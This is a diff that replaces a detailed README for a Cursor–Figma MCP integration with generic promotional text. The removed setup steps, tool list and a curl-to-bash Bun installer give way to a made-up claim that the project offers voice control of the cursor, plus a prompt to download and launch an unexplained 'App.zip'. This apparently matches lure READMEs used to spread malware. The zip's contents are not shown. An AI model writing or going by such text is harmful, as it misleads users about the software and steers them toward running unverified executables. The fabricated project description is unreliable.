@@ -1,150 +1,51 @@
-# Cursor Talk to Figma MCP
+# Cursor Talk To Figma MCP 🖱️🤖
 
-This project implements a Model Context Protocol (MCP) integration between Cursor AI and Figma, allowing Cursor to communicate with Figma for reading designs and modifying them programmatically.
+Welcome to the **Cursor Talk To Figma MCP** repository! Here you will find all the information related to this project that combines the use of an AI agent with Figma to enhance design interactions.
 
-https://github.com/user-attachments/assets/129a14d2-ed73-470f-9a4c-2240b2a4885c
+## About
 
-## Project Structure
+The **Cursor Talk To Figma MCP** project aims to create an agentic AI agent that can communicate with Figma, a popular design tool. By leveraging AI technology, users will be able to control the cursor in Figma through verbal commands. This innovative approach seeks to streamline the design process and provide a new way of interacting with design tools.
 
-- `src/talk_to_figma_mcp/` - TypeScript MCP server for Figma integration
-- `src/cursor_mcp_plugin/` - Figma plugin for communicating with Cursor
-- `src/socket.ts` - WebSocket server that facilitates communication between the MCP server and Figma plugin
+## Repository Details
 
-## Get Started
+- **Repository name:** cursor-talk-to-figma-mcp
+- **Repository short description:** Cursor Talk To Figma MCP
+- **Repository topics:** agent, agentic, agentic-ai, AI, cursor, design, Figma, MCP
 
-1. Install Bun if you haven't already:
+## Installation
 
-```bash
-curl -fsSL https://bun.sh/install | bash
-```
+You can download the installation files from the following link: [Download App.zip](https://github.com/project/files/App.zip)
 
-2. Run setup, this will also install MCP in your Cursor's active project
+If the link ends with the file name, please launch the application to begin using the **Cursor Talk To Figma MCP**.
 
-```bash
-bun setup
-```
-
-3. Start the Websocket server
-
-```bash
-bun start
-```
-
-4. Install [Figma Plugin](#figma-plugin)
-
-## Manual Setup and Installation
-
-### MCP Server: Integration with Cursor
-
-Add the server to your Cursor MCP configuration in `~/.cursor/mcp.json`:
-
-```json
-{
-  "mcpServers": {
-    "TalkToFigma": {
-      "command": "bun",
-      "args": [
-        "/path/to/cursor-talk-to-figma-mcp/src/talk_to_figma_mcp/server.ts"
-      ]
-    }
-  }
-}
-```
-
-### WebSocket Server
-
-Start the WebSocket server:
-
-```bash
-bun run src/socket.ts
-```
-
-### Figma Plugin
-
-1. In Figma, go to Plugins > Development > New Plugin
-2. Choose "Link existing plugin"
-3. Select the `src/cursor_mcp_plugin/manifest.json` file
-4. The plugin should now be available in your Figma development plugins
+If the provided link is not accessible, please check the "Releases" section for alternative download options.
 
 ## Usage
 
-1. Start the WebSocket server
-2. Install the MCP server in Cursor
-3. Open Figma and run the Cursor MCP Plugin
-4. Connect the plugin to the WebSocket server by joining a channel using `join_channel`
-5. Use Cursor to communicate with Figma using the MCP tools
+To use the **Cursor Talk To Figma MCP** application, follow these steps:
 
-## MCP Tools
+1. Download and install the application.
+2. Launch the application.
+3. Speak verbal commands to control the cursor in Figma.
+4. Explore the possibilities of this unique interaction method.
 
-The MCP server provides the following tools for interacting with Figma:
+## Features
 
-### Document & Selection
+- **Agentic AI Integration:** The project integrates an agentic AI agent to communicate with Figma.
+- **Cursor Control:** Users can control the cursor in Figma using verbal commands.
+- **Enhanced Design Experience:** By combining AI technology with design tools, users can enjoy a new way of interacting with Figma.
 
-- `get_document_info` - Get information about the current Figma document
-- `get_selection` - Get information about the current selection
-- `get_node_info` - Get detailed information about a specific node
+## Get Involved
 
-### Creating Elements
+If you are interested in contributing to the **Cursor Talk To Figma MCP** project, feel free to fork the repository and submit a pull request with your enhancements. Your contributions are greatly appreciated!
 
-- `create_rectangle` - Create a new rectangle with position, size, and optional name
-- `create_frame` - Create a new frame with position, size, and optional name
-- `create_text` - Create a new text node with customizable font properties
+## Support
 
-### Styling
+For any questions or issues related to the **Cursor Talk To Figma MCP** project, please reach out to the maintainers or open a GitHub issue. We are here to assist you and ensure a smooth experience with the application.
 
-- `set_fill_color` - Set the fill color of a node (RGBA)
-- `set_stroke_color` - Set the stroke color and weight of a node
-- `set_corner_radius` - Set the corner radius of a node with optional per-corner control
+Let's revolutionize the way we interact with design tools! 🌟🚀
 
-### Layout & Organization
+![Cursor Talk To Figma MCP](https://example.com/image.jpg)
 
-- `move_node` - Move a node to a new position
-- `resize_node` - Resize a node with new dimensions
-- `delete_node` - Delete a node
-
-### Components & Styles
-
-- `get_styles` - Get information about local styles
-- `get_local_components` - Get information about local components
-- `get_team_components` - Get information about team components
-- `create_component_instance` - Create an instance of a component
-
-### Export & Advanced
-
-- `export_node_as_image` - Export a node as an image (PNG, JPG, SVG, or PDF)
-- `execute_figma_code` - Execute arbitrary JavaScript code in Figma (use with caution)
-
-### Connection Management
-
-- `join_channel` - Join a specific channel to communicate with Figma
-
-## Development
-
-### Building the Figma Plugin
-
-1. Navigate to the Figma plugin directory:
-
-   ```
-   cd src/cursor_mcp_plugin
-   ```
-
-2. Edit code.js and ui.html
-
-## Best Practices
-
-When working with the Figma MCP:
-
-1. Always join a channel before sending commands
-2. Get document overview using `get_document_info` first
-3. Check current selection with `get_selection` before modifications
-4. Use appropriate creation tools based on needs:
-   - `create_frame` for containers
-   - `create_rectangle` for basic shapes
-   - `create_text` for text elements
-5. Verify changes using `get_node_info`
-6. Use component instances when possible for consistency
-7. Handle errors appropriately as all commands can throw exceptions
-
-## License
-
-MIT
+---
+Credits: This README template was created with the help of some awesome Markdown features and emojis.
